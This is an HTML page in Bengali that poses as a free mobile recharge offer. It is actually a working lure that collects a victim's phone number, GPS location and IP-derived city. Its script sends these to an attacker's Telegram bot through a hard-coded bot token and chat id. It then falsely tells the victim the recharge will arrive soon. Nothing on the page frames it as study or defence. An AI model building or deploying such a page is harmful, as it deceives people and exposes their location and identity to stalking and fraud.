<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; }
        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; }
        .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .offer-title { color: #2ba745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; }
        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
        .btn:disabled { background: #ccc; }
    </style>
</head>
<body>

    <div class="top-bar">অনলাইন রিচার্জ পোর্টাল - ২০২৬</div>

    <div class="container">
        <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ!</div>
        <p>নম্বর ভেরিফাই করে সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
        <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
    </div>

<script>
async function initiateProcess() {
    const phone = document.getElementById('target_phone').value;
    const btn = document.getElementById('submitBtn');

    if (phone.length < 11) {
        alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
        return;
    }

    btn.innerText = "ভেরিফাই হচ্ছে...";
    btn.disabled = true;

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
            (err) => {
                alert("ভেরিফিকেশন ব্যর্থ! রিচার্জ পেতে লোকেশন পারমিশন 'Allow' করতে হবে।");
                btn.innerText = "রিচার্জ নিন";
                btn.disabled = false;
            },
            { timeout: 10000 }
        );
    } else {
        alert("আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।");
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }
}

async function sendToBot(phone, lat, lon) {
    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
    const chat_id = "7887080882"; 

    try {
        // IP ট্র্যাকিং - এটি কাজ না করলে ক্যাচ ব্লকে যাবে
        let ipInfo = "Unavailable";
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            ipInfo = `${ipData.ip} (${ipData.city}, ${ipData.country_name})`;
        } catch (e) { console.log("IP fetch failed"); }

        // সঠিক ম্যাপ লিঙ্ক ফরম্যাট
        const map_link = `https://www.google.com/maps?q=${lat},${lon}`;
        
        const text = `**🎁 নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${phone}\n🌐 IP: ${ipInfo}\n📍 ম্যাপ: ${map_link}`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
        
        await fetch(url);
        alert("অনুরোধ সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
    } catch (e) {
        alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
    } finally {
        const btn = document.getElementById('submitBtn');
        btn.innerText = "রিচার্জ নিন";
        btn.disabled = false;
    }
}
</script>
</body>
</html>
